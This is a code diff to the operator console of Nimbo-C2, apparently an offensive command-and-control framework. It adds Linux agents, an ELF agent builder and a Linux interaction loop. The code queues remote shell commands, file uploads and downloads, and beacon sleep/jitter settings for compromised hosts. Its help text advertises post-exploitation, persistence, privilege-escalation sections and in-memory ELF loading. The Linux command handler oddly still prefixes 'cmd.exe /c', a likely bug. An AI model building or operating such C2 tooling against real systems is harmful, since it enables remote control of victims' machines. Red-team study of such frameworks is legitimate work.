@@ -28,7 +28,7 @@ user_agent_pattern = r"[0-9a-f]{8}"
 main_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 > ")])
 agent_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 "),
                                    (f"fg:{agent_prompt_color}", "[AGENT-ID]"), ("", " > ")])
-agent_completer = NestedCompleter.from_nested_dict({
+agent_completer_windows = NestedCompleter.from_nested_dict({
     'cmd ': None,
     'iex ': None,
     'download ': None,
@@ -59,6 +59,19 @@ agent_completer = NestedCompleter.from_nested_dict({
     'assembly': None,
     'msgbox': None,
     'speak': None,
+    'sleep ': None,
+    'collect': None,
+    'kill': None,
+    'show': None,
+    'back': None,
+    'cls': None,
+    'help': None,
+    'exit': None
+})
+agent_completer_linux = NestedCompleter.from_nested_dict({
+    'cmd ': None,
+    'download ': None,
+    'upload ': None,
     'sleep ': None,
     'collect': None,
     'kill': None,
@@ -134,7 +147,8 @@ def print_main_help():
     --== Builder ==--
     build exe                     ->  build exe agent (-h for help)
     build dll                     ->  build dll agent (-h for help)
-    
+    build elf                     ->  build elf agent (-h for help)
+
     --== Listener ==--
     listener start                ->  start the listener
     listener stop                 ->  stop the listener
@@ -149,8 +163,8 @@ def print_main_help():
     print(main_help)
 
 
-def print_agent_help():
-    agent_help = f"""
+def print_agent_help(os):
+    windows_help = f"""
     --== Send Commands ==--
     cmd <shell-command>                    ->  execute a shell command 
     iex <powershell-scriptblock>           ->  execute in-memory powershell command
@@ -207,7 +221,38 @@ def print_agent_help():
     exit                                   ->  exit Nimbo-C2
     """
 
-    print(agent_help)
+    linux_help = f"""
+    --== Send Commands ==--
+    cmd <shell-command>                    ->  execute a terminal command 
+    
+    --== File Stuff ==--
+    download <remote-file>                 ->  download a file from the agent (wrap path with quotes)
+    upload <local-file> <remote-path>      ->  upload a file to the agent (wrap paths with quotes)
+    
+    --== Post Exploitation Stuff ==--
+    memfd <elf-file>                       ->  load elf in-memory using the memfd_create syscall
+    
+    --== Persistence Stuff ==--
+    
+    --== Privesc Stuff ==--
+    
+    --== Communication Stuff ==--
+    sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
+    clear                                  ->  clear pending commands
+    collect                                ->  recollect agent data
+    kill                                   ->  kill the agent (persistence will still take place)
+    
+    --== General ==--
+    show                                   ->  show agent details
+    back                                   ->  back to main screen
+    cls                                    ->  clear the screen
+    help                                   ->  print this help message
+    exit                                   ->  exit Nimbo-C2
+    """
+    if os == "windows":
+        print(windows_help)
+    elif os == "linux":
+        print(linux_help)
 
 
 def print_agents(agent=None):
@@ -228,11 +273,11 @@ def print_agents(agent=None):
     utils.log_message(f"\n{tabulate(agent_table, headers='keys', tablefmt='grid')}\n", print_time=False)
 
 
-def agent_screen(agent_id):
+def agent_screen_windows(agent_id):
     while True:
         with patch_stdout():
             command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
-                                     completer=agent_completer,
+                                     completer=agent_completer_windows,
                                      complete_while_typing=False,
                                      color_depth=ColorDepth.TRUE_COLOR,
                                      wrap_lines=False)
@@ -445,7 +490,102 @@ def agent_screen(agent_id):
                 continue
 
             elif re.fullmatch(r"\s*help\s*", command):
-                print_agent_help()
+                print_agent_help("windows")
+                continue
+
+            elif re.fullmatch(r"\s*exit\s*", command):
+                raise KeyboardInterrupt
+
+            elif re.fullmatch(r"\s*", command):
+                continue
+
+            else:
+                print("[-] Wrong command")
+                continue
+
+            listener.agents[agent_id]["pending_commands"] += [command_dict]
+
+        except Exception:
+            print("[-] Could not parse command")
+            continue
+
+
+def agent_screen_linux(agent_id):
+    while True:
+        with patch_stdout():
+            command = session.prompt(eval(str(agent_prompt_text).replace("AGENT-ID", agent_id)),
+                                     completer=agent_completer_linux,
+                                     complete_while_typing=False,
+                                     color_depth=ColorDepth.TRUE_COLOR,
+                                     wrap_lines=False)
+
+        try:
+            if re.fullmatch(r"\s*cmd .+", command):
+                shell_command = re.sub(r"\s*cmd\s+", "", command, 1)
+                command_dict = {
+                    "command_type": "cmd",
+                    "shell_command": "cmd.exe /c " + shell_command
+                }
+
+            elif re.fullmatch(r"\s*download .+", command):
+                remote_file = shlex.split(re.sub(r"\s*download\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "download",
+                    "src_file": remote_file
+                }
+
+            elif re.fullmatch(r"\s*upload .+", command):
+                args = re.sub(r"\s*upload\s+", "", command, 1)
+                local_file = shlex.split(args)[0]
+                remote_file = shlex.split(args)[1]
+                local_file_content = utils.read_file(local_file)
+                if not local_file_content:
+                    continue
+                else:
+                    src_file_data_base64 = utils.encode_base_64(local_file_content, encoding="utf-8")
+                command_dict = {
+                    "command_type": "upload",
+                    "src_file_data_base64": src_file_data_base64,
+                    "dst_file_path": remote_file
+                }
+
+            elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
+                args = re.sub(r"\s*sleep\s+", "", command, 1)
+                timeframe = int(re.split(r"\s+", args)[0])
+                jitter_percent = int(re.split(r"\s+", args)[1])
+                command_dict = {
+                    "command_type": "sleep",
+                    "timeframe": timeframe,
+                    "jitter_percent": jitter_percent
+                }
+
+            elif re.fullmatch(r"\s*clear\s*", command):
+                listener.agents[agent_id]["pending_commands"] = []
+                continue
+
+            elif re.fullmatch(r"\s*kill\s*", command):
+                command_dict = {
+                    "command_type": "kill"
+                }
+
+            elif re.fullmatch(r"\s*collect\s*", command):
+                command_dict = {
+                    "command_type": "collect"
+                }
+
+            elif re.fullmatch(r"\s*show\s*", command):
+                print_agents(agent=agent_id)
+                continue
+
+            elif re.fullmatch(r"\s*back\s*", command):
+                return
+
+            elif re.fullmatch(r"\s*cls\s*", command):
+                utils.clear_screen()
+                continue
+
+            elif re.fullmatch(r"\s*help\s*", command):
+                print_agent_help("linux")
                 continue
 
             elif re.fullmatch(r"\s*exit\s*", command):
@@ -501,7 +641,10 @@ def main_screen():
 
         elif re.fullmatch(r"\s*agent\s+interact\s+" + user_agent_pattern, command):
             agent_id = re.split(r"\s+", command)[2]
-            agent_screen(agent_id)
+            if "windows" in listener.agents[agent_id]["info"]["OS Version"].lower():
+                agent_screen_windows(agent_id)
+            else:
+                agent_screen_linux(agent_id)
 
         elif re.fullmatch(r"\s*agent\s+remove\s+" + user_agent_pattern, command):
             agent_id = re.split(r"\s+", command)[2]
